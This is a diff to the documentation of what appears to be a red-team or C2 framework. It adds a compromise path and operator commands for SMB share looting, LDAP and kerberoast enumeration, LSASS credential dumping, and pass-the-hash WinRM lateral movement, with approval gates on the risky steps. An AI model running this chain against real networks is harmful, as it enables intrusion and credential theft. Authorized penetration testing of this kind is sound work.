@@ -14,6 +14,19 @@ foothold (implant)
 
 Approvals: `ldap_enum`, `kerberoast` (high).
 
+## Soft-compromise path (Support / Logging style)
+
+```
+foothold (implant)
+  → recon
+  → smb list_shares / list_dir / download (anon or creds)
+  → ldap_enum interesting (+ kerberoastable) with password or ntlm_hash
+  → lateral winrm <target> <cmd> --user u --pass p   # or --hash <NT>
+  → summarize (no DA abuse unless objective requires)
+```
+
+Approvals: `smb`, `ldap_enum`, `lateral_move` (high/critical).
+
 ## Sprint 2 path (job-complete)
 
 ```
@@ -31,11 +44,16 @@ sessions
 use <id>
 shell whoami
 ifconfig
-ldap-enum kerberoastable --domain DOM --dc dc.dom.local
+smb list_shares --host 10.10.10.10 --anon
+smb list_dir --host 10.10.10.10 --share support-tools --anon
+smb download --host 10.10.10.10 --share Logs --path IdentitySync_Trace.log --user u --pass p
+ldap-enum interesting --domain DOM --dc dc.dom.local --user u --pass p
+ldap-enum kerberoastable --domain DOM --dc dc.dom.local --hash <NT>
 pending / approve <id>
 kerberoast --domain DOM --dc dc.dom.local --user u --pass p
 creds-dump lsass
 lateral winrm <target> <cmd> --user u --pass p
+lateral winrm <target> <cmd> --user u --hash <NThash> --domain DOM
 loot
 ```
 
